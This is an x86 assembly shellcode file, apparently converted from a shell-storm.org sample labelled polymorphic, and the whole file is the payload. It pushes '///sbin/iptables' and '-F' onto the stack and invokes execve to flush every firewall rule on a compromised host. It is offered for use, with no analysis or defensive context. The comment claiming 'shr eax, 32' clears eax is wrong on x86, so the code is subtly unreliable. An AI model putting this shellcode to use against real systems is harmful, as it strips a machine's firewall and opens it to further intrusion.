; POLYMORPHIC SHELLCODE
; http://shell-storm.org/shellcode/files/shellcode-825.php

; THIS HAS BEEN CONVERTED TO INTEL SYNTAX

global _start

section .text

_start:
    shr eax, 32 ; clear eax
    and ebx, eax ; clear ebx
    or bx, 0x462d
    push ebx
    mov esi, esp ;               ESI-> "-F"
    and ebx, eax ; clear ebx
    or ebx, 0x73656c62
    push eax
    push ebx
    and ebx, eax ; clear ebx
    or ebx, 0x61747069
    push ebx
    and ebx, eax ; clear ebx
    or ebx, 0x2f6e6962
    push ebx
    and ebx, eax; clear ebx
    or ebx, 0x732f2f2f
    push ebx
    and ebx, eax
    or ebx, esp ;                EBX-> "///sbin/iptables"
    push eax
    push esi
    push ebx
    and ecx, eax
    or ecx, esp ;                ECX-> argv
    mov al, 0xb ; syscall execve
    int 0x80
